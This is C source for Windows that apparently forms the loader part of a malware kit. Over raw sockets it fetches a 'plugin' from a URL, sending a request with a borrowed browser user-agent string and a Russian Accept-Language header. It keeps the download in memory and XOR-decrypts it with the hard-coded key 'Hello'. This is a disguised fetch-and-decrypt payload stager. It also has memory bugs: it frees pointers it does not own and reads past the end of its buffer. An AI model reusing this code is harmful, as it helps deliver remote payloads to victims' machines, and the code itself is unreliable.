#include "stdafx.h"
#include "Load.h"

char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved )
{
	DWORD dwLen = 0;

	char *Buffer = NULL;

	int Bytes = 0;

	char *TempBuffer = (char*)malloc( 1024 );

	if ( TempBuffer == NULL )
	{
		return NULL;
	}

	while ( ( Bytes = (int)recv( Socket, TempBuffer, 1024, 0 ) ) != 0 )
	{
		if ( Bytes == -1 )
		{
			break;
		}

		if ( Buffer == NULL )
		{
			Buffer = (char*)malloc( Bytes + 1 );

			if ( Buffer == NULL )
			{
				free(TempBuffer);
				return NULL;
			}
		}
		else
		{
			char *p = (char*)realloc( Buffer, dwLen + Bytes + 1 );
						
			if ( p == NULL )
			{
				free(TempBuffer);
				free(Buffer);
				return NULL;
			}

			Buffer = p;
		}

		memcpy( Buffer + dwLen, TempBuffer, Bytes );
		dwLen += Bytes;
	}

	free( TempBuffer );

	if ( dwLen > 0 )
	{
		DWORD Offset = 0;

		for ( DWORD i = 0; i < dwLen; i++ )
		{
			if ( Buffer[i]     == '\r' && Buffer[i + 1] == '\n' &&
				 Buffer[i + 2] == '\r' && Buffer[i + 3] == '\n' )
			{
				Offset = i + 4;
				break;
			}
		}

		if ( Offset > 0 )
		{
			Buffer += Offset;
			dwLen  -= Offset;

			*dwRecved = dwLen;

			return Buffer;
		}
	}

	free( Buffer );
	
	return NULL;
}

SOCKET MyConnect( char *Host, int Port )
{
	LPHOSTENT lpHost = (LPHOSTENT)gethostbyname( (const char*)Host );

	if ( lpHost == NULL )
	{
		return -1;
	}

	SOCKET Socket = (SOCKET)socket( AF_INET, SOCK_STREAM, 0 );

	if( Socket == -1 )
	{
		return -1;
	}

	struct sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = htons( (unsigned short)Port );

	if ( (int)connect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		closesocket(Socket);
		return -1;
	}

	return Socket;
}

bool MySend( SOCKET Socket, const char *Data, int DataLen )
{
	if ( (int)send( Socket, Data, DataLen, 0 ) == SOCKET_ERROR )
	{
		return false;
	}

	return true;
}

bool ParseUrl( char *Url, char **Server, char **Path, int *Port )
{
	char *Ptr1 = NULL;
	char *Ptr2 = NULL;
	char *Ptr3 = NULL;
	char *Ptr4 = NULL;

	char *Host		   = (char*)malloc( 512 );
	if(!Host) return false;
	char *OptionalPort = (char*)malloc( 512 );
	if(!OptionalPort) 
	{
		free(Host);
		return false;
	}

	DWORD dwPort = 0;

	Ptr1 = strstr( Url, "://" );

	if( Ptr1 )
	{
		Ptr1 += 3;
	}
	else
	{
		Ptr1 = Url;
	}

    Ptr4 = strstr( Ptr1, "/" );
	Ptr2 = strstr( Ptr1, ":" );

	if( !Ptr2 )
	{
		*Port = 80;
		Ptr3   = strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			free(OptionalPort);
			free(Host);
			return false;
		}

		memcpy( Host, Ptr1, Ptr3 - Ptr1 );
		Host[ Ptr3 - Ptr1 ] = '\0';
	}
	else
	{
		Ptr3 = strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			free(OptionalPort);
			free(Host);
			return false;
		}

		memcpy( OptionalPort, Ptr2 + 1, Ptr3 - Ptr2 );
		memcpy( Host, Ptr1, Ptr2 - Ptr1 );

		OptionalPort[ Ptr3 - Ptr2 ] = '\0';
		Host[ Ptr2 - Ptr1 ]			= '\0';

		*Port = atoi( OptionalPort );
	}

	free( OptionalPort );

	*Server = Host;
	*Path   = Ptr4;

	return true;
}

bool AsyncDownload1( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize )
{
	WSADATA wsa;

	if ( (int)WSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}
	
	char *Host = NULL;
	char *Path = NULL;
	int   Port = 80;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	SOCKET Socket = MyConnect( Host, Port );

	if( Socket == -1 )
	{
		free(Host);
		free(Path);
		return false;
	}
	
	char *UserAgent = NULL;
	UserAgent = (char*)malloc( 1024*sizeof(char) );
	DWORD dwUserSize = 1024*sizeof(WCHAR);

	ObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *query=(char*)malloc(2048*sizeof(char));

	strcpy(query,"GET /");
	strcat(query,Path);
	strcat(query," HTTP/1.1\r\nAccept: */* \r\n ");
	strcat(query,"Accept-Language: ru \r\n");
	strcat(query,"UA-CPU: x86 \r\n");
	strcat(query,"Accept-Encoding: gzip, deflate \r\n");
	strcat(query,"User-Agent: ");
	strcat(query,UserAgent);
	strcat(query,"\r\nHost: ");
	strcat(query,Host);
	strcat(query,"\r\nConnection: Close\r\n\r\n\r\n");



	bool b = MySend( Socket, (const char *)query, (int)strlen( query ) );


	free( Host );
	free( Path );
	free( UserAgent );
	free( query );
	if ( !b )
	{
		return false;
	}

	DWORD dwSizeFile = 0;

	char *Buffer = RecvAndParse( Socket, &dwSizeFile );

	if ( !Buffer )
	{
		closesocket( Socket );
		return false;
	}

	if ( dwSize )
	{
		*lpBuffer  = (LPBYTE)Buffer;
		*dwSize    = dwSizeFile;

		return true;
	}

	return false;
}

bool DownloadInternet( char *Url, LPBYTE *lpMem, LPDWORD dwMemSize  )
{
	LPBYTE lpMemory;
	DWORD  dwMemorySize;

	bool ret = AsyncDownload1( Url, &lpMemory, &dwMemorySize );

	if ( ret )
	{
		*lpMem		= lpMemory;
		*dwMemSize	= dwMemorySize;
	}
	

	return ret;
}
/*
bool DownloadInFile( char *Url, WCHAR *FileName )
{
	return DownloadInternet(Url, FileName, 1, NULL, NULL );
}
*/
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize )
{
	return DownloadInternet( Url, lpMem, dwSize );
}

DWORD Crypt( char* lpPassword, LPBYTE lpResult, DWORD dwSize )
{
    DWORD a = 0, b = 0;
    a = 0;
 
    while ( a < dwSize )
    {
        b = 0;
 
        while ( lpPassword[b] ) 
        {
            lpResult[a] ^= ( lpPassword[b] + ( a * b ) );
            b++; 
        }
        a++; 
    }

 return a;
}

LPVOID DownloadPlugin( char *Url, DWORD *dwLen )
{
	LPBYTE Pointer  = NULL;

	if ( !DownloadInMem( Url, &Pointer, dwLen ) )
	{
		return NULL;
	}

	DWORD dwSize = Crypt( "Hello", (LPBYTE)Pointer, *dwLen );
	if ( dwSize > 0 )
	{
		return (LPVOID)Pointer;
	}

	return NULL;
}
